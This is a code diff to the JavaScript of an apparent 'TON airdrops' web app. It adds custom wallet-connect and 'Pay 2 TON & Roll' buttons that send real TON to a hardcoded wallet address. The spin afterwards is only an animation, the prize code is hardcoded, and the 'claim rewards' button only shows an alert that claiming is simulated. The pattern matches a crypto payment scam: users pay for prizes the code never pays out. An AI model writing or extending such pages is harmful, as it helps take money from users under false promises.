@@ -55,7 +55,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- 4. TON Connect Wallet & Rolls Logic ---
     const rollsInfoText = document.querySelector('.rolls-info-text');
-    const tonConnectDiv = document.getElementById('ton-connect'); // The div where TonConnectUI renders its button
+    const connectWalletBtnRolls = document.getElementById('connectWalletBtnRolls'); // Re-added custom button
+    const payForRollsBtn = document.getElementById('payForRollsBtn'); // Re-added custom button
     const codeEntrySection = document.querySelector('.code-entry-section');
     const confirmationCodeInput = document.getElementById('confirmationCodeInput');
     const verifyCodeBtn = document.getElementById('verifyCodeBtn');
@@ -65,63 +66,106 @@ document.addEventListener('DOMContentLoaded', () => {
     const checkmarkAnimation = document.querySelector('.checkmark-animation');
     const spinningWheel = document.querySelector('.spinning-wheel');
 
-    // Initialize TON Connect UI with the specified buttonRootId
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+    let isWalletConnected = false; // Track connection status
+    let tonConnectUI; // Declare globally or in a scope accessible by init
+
+    // Initialize TON Connect UI - NO buttonRootId when using custom buttons
+    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://tonairdrops.vercel.app/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect' // TonConnectUI will render its button here
+        // No buttonRootId here, we handle the buttons manually
     });
 
     // Listen for TonConnectUI status changes
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
-            // Wallet is connected
-            rollsInfoText.textContent = `Wallet connected: ${wallet.account.address.substring(0, 6)}...${wallet.account.address.substring(wallet.account.address.length - 4)}. Press the button above to pay 2 TON and roll!`;
-            // Simulate the transaction success flow after a short delay, as TonConnectUI's button will handle the actual transaction.
-            // In a real DApp, this would be triggered by a successful transaction callback from TonConnectUI.
-            setTimeout(simulateTonConnectTransactionSuccess, 1000); // Simulate after 1 second of connection
+            isWalletConnected = true;
+            rollsInfoText.textContent = `Wallet connected: ${wallet.account.address.substring(0, 6)}...${wallet.account.address.substring(wallet.account.address.length - 4)}. Pay 2 TON to roll!`;
+            connectWalletBtnRolls.classList.add('hide'); // Hide connect button
+            payForRollsBtn.classList.remove('hide'); // Show pay button
+            // Optionally, if there's an ongoing process, hide code entry/referral
+            codeEntrySection.classList.add('hide');
+            referralAfterCodeMessage.classList.add('hide');
+
         } else {
-            // Wallet is disconnected
+            isWalletConnected = false;
             rollsInfoText.textContent = 'Connect your TON wallet to participate.';
-            // Hide related sections if wallet disconnects
+            connectWalletBtnRolls.classList.remove('hide'); // Show connect button
+            payForRollsBtn.classList.add('hide'); // Hide pay button
             codeEntrySection.classList.add('hide');
             referralAfterCodeMessage.classList.add('hide');
         }
     });
 
-    const simulateTonConnectTransactionSuccess = () => {
-        loadingAnimation.classList.remove('hide');
-        rollsInfoText.classList.add('hide');
-        
-        // Spin the wheel
-        spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
-        spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`; // Spin 3+ times
+    // Custom Connect Wallet Button Click
+    connectWalletBtnRolls.addEventListener('click', async () => {
+        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic feedback
+        try {
+            await tonConnectUI.openModal(); // Open the TonConnectUI modal
+        } catch (e) {
+            console.error('Wallet connection failed:', e);
+            rollsInfoText.textContent = 'Wallet connection failed. Please try again.';
+        }
+    });
 
-        setTimeout(() => {
-            loadingAnimation.classList.add('hide');
-            checkmarkAnimation.classList.remove('hide');
-            rollsInfoText.classList.remove('hide');
-            rollsInfoText.textContent = 'Payment successful! Enter your code to claim your prize.';
-            codeEntrySection.classList.remove('hide');
-            checkmarkAnimation.addEventListener('loopComplete', () => {
-                checkmarkAnimation.classList.add('hide');
-            }, { once: true });
+    // Custom Pay 2 TON & Roll Button Click
+    payForRollsBtn.addEventListener('click', async () => {
+        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic feedback
+        if (!isWalletConnected) {
+            rollsInfoText.textContent = 'Please connect your wallet first!';
+            return;
+        }
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
+            messages: [
+                {
+                    address: 'UQD8J5QN9ygpY30_afh0pqnpmTVHePlt1WrTBg-otAUjDpNG', // Your specified wallet address for 2 TON
+                    amount: '2000000000', // 2 TON in nanoton (2 * 10^9)
+                },
+            ],
+        };
+
+        try {
+            // Send the transaction using TonConnectUI
+            const result = await tonConnectUI.sendTransaction(transaction);
+            console.log('Transaction successful:', result);
             
-            // Trigger vibration
-            if (navigator.vibrate) {
-                navigator.vibrate(100); // Medium vibration for successful payment/spin
-            }
-        }, 4000); // Simulate 4 seconds for spin + loading
-    };
+            // --- Simulate successful payment and spin ---
+            loadingAnimation.classList.remove('hide');
+            payForRollsBtn.classList.add('hide');
+            rollsInfoText.classList.add('hide');
+            
+            // Spin the wheel
+            spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
+            spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`; // Spin 3+ times
+
+            if (navigator.vibrate) { navigator.vibrate(100); } // Medium vibration for successful payment/spin
+
+            setTimeout(() => {
+                loadingAnimation.classList.add('hide');
+                checkmarkAnimation.classList.remove('hide');
+                rollsInfoText.classList.remove('hide');
+                rollsInfoText.textContent = 'Payment successful! Enter your code to claim your prize.';
+                codeEntrySection.classList.remove('hide');
+                checkmarkAnimation.addEventListener('loopComplete', () => {
+                    checkmarkAnimation.classList.add('hide');
+                }, { once: true });
+            }, 4000); // Simulate 4 seconds for spin + loading after successful transaction
+
+        } catch (e) {
+            console.error('Transaction failed:', e);
+            rollsInfoText.textContent = 'Payment failed. Please try again.';
+            loadingAnimation.classList.add('hide'); // Hide loading if it was shown
+            payForRollsBtn.classList.remove('hide'); // Show pay button again
+        }
+    });
     
     // Simulate code verification
     verifyCodeBtn.addEventListener('click', () => {
         const enteredCode = confirmationCodeInput.value.trim();
         codeErrorMessage.classList.add('hide'); // Hide previous errors
         
-        // Haptic Feedback for button click
-        if (navigator.vibrate) {
-            navigator.vibrate(50); // Short subtle vibration
-        }
+        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click
 
         if (enteredCode === '909986') { // Correct code
             codeEntrySection.classList.add('hide');
@@ -131,9 +175,7 @@ document.addEventListener('DOMContentLoaded', () => {
         } else {
             codeErrorMessage.classList.remove('hide');
             confirmationCodeInput.classList.add('error'); // Add error styling
-            if (navigator.vibrate) { // Vibrate for error
-                navigator.vibrate(150);
-            }
+            if (navigator.vibrate) { navigator.vibrate(150); } // Vibrate for error
             setTimeout(() => confirmationCodeInput.classList.remove('error'), 1500); // Remove error after a bit
         }
     });
@@ -176,10 +218,7 @@ document.addEventListener('DOMContentLoaded', () => {
     updateStakingSummary(); // Initial calculation
 
     stakeTonBtn.addEventListener('click', () => {
-        // Haptic Feedback for button click
-        if (navigator.vibrate) {
-            navigator.vibrate(50); // Short subtle vibration
-        }
+        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click
 
         const amount = parseFloat(stakingAmountInput.value);
         if (isNaN(amount) || amount <= 0) {
@@ -195,10 +234,7 @@ document.addEventListener('DOMContentLoaded', () => {
         e.preventDefault();
         learnMoreContent.classList.toggle('hide');
         learnMoreLink.textContent = learnMoreContent.classList.contains('hide') ? 'Learn More About Staking' : 'Show Less';
-        // Haptic Feedback for toggle
-        if (navigator.vibrate) {
-            navigator.vibrate(30);
-        }
+        if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback for toggle
     });
 
     // --- 6. Earn Section Logic ---
@@ -214,19 +250,13 @@ document.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => {
             copyReferralBtn.innerHTML = '<i class="far fa-copy"></i> Copy'; // Reset button text
         }, 2000);
-        // Haptic Feedback
-        if (navigator.vibrate) {
-            navigator.vibrate(50);
-        }
+        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback
     });
 
     if (claimRewardBtn) {
         claimRewardBtn.addEventListener('click', () => {
             alert('Claiming rewards simulated! In a real DApp, this would initiate a withdrawal transaction.');
-            // Haptic Feedback
-            if (navigator.vibrate) {
-                navigator.vibrate(70);
-            }
+            if (navigator.vibrate) { navigator.vibrate(70); } // Haptic Feedback
         });
     }
 
@@ -242,10 +272,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     teamPhotos.forEach(photo => {
         photo.addEventListener('click', () => {
-            // Haptic Feedback
-            if (navigator.vibrate) {
-                navigator.vibrate(30);
-            }
+            if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback
 
             // Toggle elevated class for the clicked photo
             if (photo.classList.contains('elevated')) {
